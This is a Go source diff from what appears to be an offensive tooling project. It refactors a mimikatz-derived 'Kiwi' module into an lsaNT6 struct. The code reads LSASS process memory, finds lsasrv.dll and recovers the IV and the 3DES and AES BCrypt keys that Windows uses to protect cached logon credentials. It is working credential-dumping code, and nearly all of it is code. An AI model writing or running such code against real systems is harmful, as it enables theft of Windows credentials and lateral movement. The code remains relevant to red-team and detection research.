@@ -4,6 +4,7 @@ import (
 	"bytes"
 	"fmt"
 	"runtime"
+	"sync"
 	"unsafe"
 
 	"github.com/pkg/errors"
@@ -12,6 +13,28 @@ import (
 	"project/internal/logger"
 	"project/internal/module/windows/api"
 )
+
+type lsaNT6 struct {
+	ctx *Kiwi
+
+	iv      []byte
+	key3DES *api.BcryptKey
+	keyAES  *api.BcryptKey
+
+	mu sync.Mutex
+}
+
+func newLSA6(ctx *Kiwi) *lsaNT6 {
+	return &lsaNT6{ctx: ctx}
+}
+
+func (lsa *lsaNT6) logf(lv logger.Level, format string, log ...interface{}) {
+	lsa.ctx.logger.Printf(lv, "kiwi-lsa", format, log...)
+}
+
+func (lsa *lsaNT6) log(lv logger.Level, log ...interface{}) {
+	lsa.ctx.logger.Println(lv, "kiwi-lsa", log...)
+}
 
 // reference:
 // https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
@@ -122,8 +145,8 @@ var (
 // reference:
 // https://github.com/gentilkiwi/mimikatz/blob/master/mimikatz/modules/sekurlsa/crypto/kuhl_m_sekurlsa_nt6.c
 
-func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
-	lsasrv, err := kiwi.lsass.GetBasicModuleInfo(pHandle, "lsasrv.dll")
+func (lsa *lsaNT6) acquireKeys(pHandle windows.Handle) error {
+	lsasrv, err := lsa.ctx.lsass.GetBasicModuleInfo(pHandle, "lsasrv.dll")
 	if err != nil {
 		return err
 	}
@@ -139,14 +162,15 @@ func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
 	case "amd64":
 		patches = lsaInitProtectedMemoryKeyReferencesX64
 	}
-	_, _, build := kiwi.getWindowsVersion()
+	_, _, build := lsa.ctx.getWindowsVersion()
 	patch := selectGenericPatch(patches, build)
 	// find special data offset
 	index := bytes.Index(memory, patch.search.data)
 	// read offset about iv
 	address := lsasrv.address + uintptr(index+patch.offsets.off0)
 	var offset uint32
-	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
+	size := unsafe.Sizeof(offset)
+	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read offset about iv")
 	}
@@ -157,21 +181,21 @@ func (kiwi *Kiwi) acquireNT6LSAKeys(pHandle windows.Handle) error {
 	if err != nil {
 		return errors.WithMessage(err, "failed to read iv data")
 	}
-	kiwi.iv = iv
-	kiwi.log(logger.Debug, "iv data:", iv)
+	lsa.iv = iv
+	lsa.log(logger.Debug, "iv data:", iv)
 	// acquire 3DES key
 	address = lsasrv.address + uintptr(index+patch.offsets.off1)
-	err = kiwi.acquireNT6LSAKey(pHandle, address, "3DES")
+	err = lsa.acquireNT6LSAKey(pHandle, address, "3DES")
 	if err != nil {
 		return errors.WithMessage(err, "failed to acquire 3DES key")
 	}
 	// acquire AES key
 	address = lsasrv.address + uintptr(index+patch.offsets.off2)
-	err = kiwi.acquireNT6LSAKey(pHandle, address, "AES")
+	err = lsa.acquireNT6LSAKey(pHandle, address, "AES")
 	if err != nil {
 		return errors.WithMessage(err, "failed to acquire AES key")
 	}
-	kiwi.log(logger.Info, "acquire NT6 LSA keys successfully")
+	lsa.log(logger.Info, "acquire NT6 LSA keys successfully")
 	return nil
 }
 
@@ -230,24 +254,27 @@ type hardKey struct {
 	data   [4]byte // self append, not used
 }
 
-func (kiwi *Kiwi) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, algorithm string) error {
+func (lsa *lsaNT6) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, algorithm string) error {
 	const (
 		bhKeyTag = 0x55555552 // U U U R
 		bKeyTag  = 0x4D53534B // M S S K
 	)
 	var offset int32
-	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), unsafe.Sizeof(offset))
+	size := unsafe.Sizeof(offset)
+	_, err := api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&offset)), size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read offset about bcrypt handle key")
 	}
 	address += unsafe.Sizeof(offset) + uintptr(offset)
 	var bhkAddr uintptr
-	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&bhkAddr)), unsafe.Sizeof(bhkAddr))
+	size = unsafe.Sizeof(bhkAddr)
+	_, err = api.ReadProcessMemory(pHandle, address, (*byte)(unsafe.Pointer(&bhkAddr)), size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read address about bcrypt handle key")
 	}
 	var bhKey bcryptHandleKey
-	_, err = api.ReadProcessMemory(pHandle, bhkAddr, (*byte)(unsafe.Pointer(&bhKey)), unsafe.Sizeof(bhKey))
+	size = unsafe.Sizeof(bhKey)
+	_, err = api.ReadProcessMemory(pHandle, bhkAddr, (*byte)(unsafe.Pointer(&bhKey)), size)
 	if err != nil {
 		return errors.WithMessage(err, "failed to read bcrypt handle key")
 	}
@@ -255,7 +282,7 @@ func (kiwi *Kiwi) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, algo
 		return errors.New("read invalid bcrypt handle key")
 	}
 	// read hard key data
-	_, _, build := kiwi.getWindowsVersion()
+	_, _, build := lsa.ctx.getWindowsVersion()
 	var (
 		bcryptKeySize   uintptr
 		bcryptKeyOffset uintptr
@@ -286,11 +313,11 @@ func (kiwi *Kiwi) acquireNT6LSAKey(pHandle windows.Handle, address uintptr, algo
 	if err != nil {
 		return errors.WithMessage(err, "failed to read bcrypt handle key")
 	}
-	kiwi.logf(logger.Debug, "%s hard key data: 0x%X", algorithm, hardKeyData)
-	return kiwi.generateSymmetricKey(hardKeyData, algorithm)
+	lsa.logf(logger.Debug, "%s hard key data: 0x%X", algorithm, hardKeyData)
+	return lsa.generateSymmetricKey(hardKeyData, algorithm)
 }
 
-func (kiwi *Kiwi) generateSymmetricKey(hardKeyData []byte, algorithm string) error {
+func (lsa *lsaNT6) generateSymmetricKey(hardKeyData []byte, algorithm string) error {
 	// open provider
 	algHandle, err := api.BCryptOpenAlgorithmProvider(algorithm, "", 0)
 	if err != nil {
@@ -305,10 +332,10 @@ func (kiwi *Kiwi) generateSymmetricKey(hardKeyData []byte, algorithm string) err
 	switch algorithm {
 	case "3DES":
 		mode = windows.StringToUTF16("ChainingModeCBC")
-		key = &kiwi.key3DES
+		key = &lsa.key3DES
 	case "AES":
 		mode = windows.StringToUTF16("ChainingModeCFB")
-		key = &kiwi.keyAES
+		key = &lsa.keyAES
 	default:
 		panic(fmt.Sprintf("invalid algorithm: %s", algorithm))
 	}
@@ -336,4 +363,16 @@ func (kiwi *Kiwi) generateSymmetricKey(hardKeyData []byte, algorithm string) err
 	}
 	*key = bk
 	return nil
+}
+
+func (lsa *lsaNT6) Close() {
+	lsa.mu.Lock()
+	defer lsa.mu.Unlock()
+	if lsa.key3DES != nil {
+		lsa.key3DES.Destroy()
+	}
+	if lsa.keyAES != nil {
+		lsa.keyAES.Destroy()
+	}
+	lsa.ctx = nil
 }
